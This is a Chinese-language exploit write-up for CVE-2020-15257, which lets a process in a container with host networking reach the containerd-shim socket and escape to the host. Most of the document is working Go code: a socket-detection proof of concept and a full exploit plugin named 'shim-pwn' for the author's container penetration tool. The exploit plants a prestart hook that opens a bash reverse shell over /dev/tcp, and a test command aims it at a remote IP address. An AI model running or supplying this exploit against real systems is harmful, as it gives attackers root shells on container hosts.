@@ -1,0 +1,276 @@
+## CVE-2020-15257
+漏洞原理、基础知识请阅读以下链接，不再展开：
+  * 
+或者中文的：
+  * 
+简要来说，containerd->containerd-shim->runc 的通信模型中，containerd-shim的接口作为abstract
+unix socket暴露，在docker使用net=host参数启动、与宿主机共享net namespace时，其中的unix
+socket可以被容器内部访问到，容器中攻击者通过该socket可以通过API控制下游runc进程启动新的恶意镜像，并通过该镜像逃逸。
+## POC
+这个漏洞POC比较简单，只要探测到docker内部有containerd-shim启动的unix socket即可确认。
+  * 
+    package main
+    import (
+        "context"
+        "errors"
+        "io/ioutil"
+        "log"
+        "net"
+        "regexp"
+        "strings"
+        "github.com/containerd/ttrpc"
+        "github.com/gogo/protobuf/types"
+    )
+    func exp(sock string) bool {
+        sock = strings.Replace(sock, "@", "", -1)
+        conn, err := net.Dial("unix", "\x00"+sock)
+        if err != nil {
+            log.Println(err)
+            return false
+        }
+        client := ttrpc.NewClient(conn)
+        shimClient := NewShimClient(client)
+        ctx := context.Background()
+        info, err := shimClient.ShimInfo(ctx, &types.Empty{})
+        if err != nil {
+            log.Println("rpc error:", err)
+            return false
+        }
+        log.Println("shim pid:", info.ShimPid)
+        return true
+    }
+    func getShimSockets() ([][]byte, error) {
+        re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
+        if err != nil {
+            return nil, err
+        }
+        data, err := ioutil.ReadFile("/proc/net/unix")
+        matches := re.FindAll(data, -1)
+        if matches == nil {
+            return nil, errors.New("Cannot find vulnerable socket")
+        }
+        return matches, nil
+    }
+    func main() {
+        matchset := make(map[string]bool)
+        socks, err := getShimSockets()
+        if err != nil {
+            log.Fatalln(err)
+        }
+        for _, b := range socks {
+            sockname := string(b)
+            if _, ok := matchset[sockname]; ok {
+                continue
+            }
+            log.Println("try socket:", sockname)
+            matchset[sockname] = true
+            if exp(sockname) {
+                break
+            }
+        }
+        return
+    }
+这里通过docker内部/proc/net/unix中匹配固定socket即可判断是否存在漏洞，进一步可以创建shim
+cliet通过grpc(ttrpc)协议调用API，这里调用`shimClient.ShimInfo`作为POC是因为这个接口简单，不需要传参，可以通过返回值进一步确认该socket可用。
+这个漏洞原理简单、poc简单、难点在于利用，exp要对docker启动的内部过程非常了解，并模拟出全部docker启动所必须的参数，在其中构造逃逸点。
+截止本篇完稿，目前未见公开的exp代码。
+## 已有的Exp思路
+  * 
+漏洞发现者指出通过启动新镜像mount宿主机文件，再写宿主机文件如/etc/crontab完成逃逸，这里问题有：
+  1. config.json生成的时候需要传参，rootfs和mount的id字段需要动态指定，而且rootfs需要一个本地的文件支撑，在容器内部模拟这个环境略显复杂。
+## 新的思路
+  * 适配rootfs环境并重启一个定制化的镜像过于复杂，自动化困难，那么我们能否不启动容器的情况下直接接管containerd-shim进程呢？
+笔者在构造config.json模拟镜像启动过程中，从常规docker run生成的config.json中发现以下字段同时存在command input：
+文档中发现这个shell可以在容器未落地之前执行：
+  * 
+> Prestart
+>
+> The pre-start hooks MUST be called after the start operation is called but
+> before the user-specified program command is executed. On Linux, for
+> example, they are called after the container namespaces are created, so they
+> provide an opportunity to customize the container (e.g. the network
+> namespace could be specified in this hook).
+## 最终利用代码
+    package exploit
+    import (
+        "context"
+        "errors"
+        "github.com/Xyntax/CDK/pkg/lib"
+        "github.com/Xyntax/CDK/pkg/util"
+        shimapi "github.com/containerd/containerd/runtime/v1/shim/v1"
+        "github.com/containerd/ttrpc"
+        "io/ioutil"
+        "log"
+        "net"
+        "regexp"
+        "strings"
+    )
+    var configJson = `
+    {
+      "ociVersion": "1.0.1-dev",
+      "process": {
+        "terminal": true,
+        "user": {
+          "uid": 0,
+          "gid": 0
+        },
+        "args": [
+          "/bin/bash"
+        ],
+        "env": [
+          "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+          "HOSTNAME=b6cee9b57f3b",
+          "TERM=xterm"
+        ],
+        "cwd": "/"
+      },
+      "root": {
+       "path": "/tmp"
+      },
+      "hostname": "b6cee9b57f3b",
+      "hooks": {
+            "prestart": [
+                {
+                    "path": "/bin/bash",
+                    "args": ["bash", "-c", "bash -i >& /dev/tcp/$RHOST$/$RPORT$ 0>&1"],
+                    "env":  ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"]
+                }
+            ]
+        },
+      "linux": {
+        "resources": {
+          "devices": [
+            {
+              "allow": false,
+              "access": "rwm"
+            }
+          ],
+          "memory": {
+            "disableOOMKiller": false
+          },
+          "cpu": {
+            "shares": 0
+          },
+          "blockIO": {
+            "weight": 0
+          }
+        },
+        "namespaces": [
+          {
+            "type": "mount"
+          },
+          {
+            "type": "network"
+          },
+          {
+            "type": "uts"
+          },
+          {
+            "type": "ipc"
+          }
+        ]
+      }
+    }
+    `
+    func exp(sock,rhost,rport string) bool {
+        sock = strings.Replace(sock, "@", "", -1)
+        conn, err := net.Dial("unix", "\x00"+sock)
+        if err != nil {
+            log.Println(err)
+            return false
+        }
+        client := ttrpc.NewClient(conn)
+        shimClient := shimapi.NewShimClient(client)
+        ctx := context.Background()
+        // config.json file /run/containerd/io.containerd.runtime.v1.linux/moby//config.json
+        // rootfs path /var/lib/docker/overlay2//merged
+        localBundlePath := "/tmp"
+        dockerAbsPath := GetDockerAbsPath()+"/merged"+localBundlePath
+        configJson = strings.Replace(configJson,"$RHOST$",rhost,-1)
+        configJson = strings.Replace(configJson,"$RPORT$",rport,-1)
+        err = ioutil.WriteFile(localBundlePath+"/config.json", []byte(configJson), 0666)
+        if err != nil {
+            log.Println("failed to write file.", err)
+            return false
+        }
+        var M = shimapi.CreateTaskRequest{
+            ID:       util.RandString(10), // needs to be different in each exploit
+            Bundle:   dockerAbsPath, // use container abspath so runc can find config.json
+            Terminal: true,
+            Stdin:    "/dev/null",
+            Stdout:   "/dev/null",
+            Stderr:   "/dev/null",
+        }
+        info, err := shimClient.Create(ctx, &M)
+        if err != nil {
+            log.Println("rpc error:", err)
+            return false
+        }
+        log.Println("shim pid:", info.Pid)
+        return true
+    }
+    func getShimSockets() ([][]byte, error) {
+        re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
+        if err != nil {
+            return nil, err
+        }
+        data, err := ioutil.ReadFile("/proc/net/unix")
+        matches := re.FindAll(data, -1)
+        if matches == nil {
+            return nil, errors.New("Cannot find vulnerable socket")
+        }
+        return matches, nil
+    }
+    func mainContainerdPwn(rhost string,rport string) {
+        matchset := make(map[string]bool)
+        socks, err := getShimSockets()
+        if err != nil {
+            log.Fatalln(err)
+        }
+        for _, b := range socks {
+            sockname := string(b)
+            if _, ok := matchset[sockname]; ok {
+                continue
+            }
+            log.Println("try socket:", sockname)
+            matchset[sockname] = true
+            if exp(sockname,rhost,rport) {
+                break
+            }
+        }
+        return
+    }
+    // plugin interface
+    type containerdShimPwnS struct{}
+    func (p containerdShimPwnS) Desc() string {
+        return "pwn CVE-2020-15257,start a privileged reverse shell to remote host. usage: ./cdk shim-pwn  "
+    }
+    func (p containerdShimPwnS) Run() bool {
+        args := lib.Args[""].([]string)
+        if len(args) != 2 {
+            log.Println("invalid input args.")
+            log.Fatal(p.Desc())
+        }
+        rhost := args[0]
+        rport := args[1]
+        log.Printf("tring to spawn shell to %s:%s\n",rhost,rport)
+        mainContainerdPwn(rhost,rport)
+        return true
+    }
+    func init() {
+        plugin := containerdShimPwnS{}
+        lib.Register("shim-pwn", plugin)
+    }
+集成在我的容器渗透工具里，可自行下载测试:
+  * 
+有个细节，要让宿主机找到容器内部的config.json，需要向宿主机传递容器内部文件的绝对路径。
+## 测试步骤：
+宿主机：随便启动一个容器，让containerd-shim的unix socket暴露出来
+    docker run -d -it ubuntu /bin/bash
+现在要启动一个容器，我们通过exp逃逸这个容器：
+    docker run --rm --net=host -it ubuntu /bin/bash
+这个容器包含CVE-2020-15257的利用条件——net namespace与宿主机共享。
+进入容器，植入我们的渗透工具 ()
+在容器中执行exp，自动搜索可用的socket并反弹宿主机的shell到远端服务器，完成逃逸：
+    ./cdk_linux_amd64 run shim-pwn 47.104.151.168 111
+成功逃逸并反弹shell：
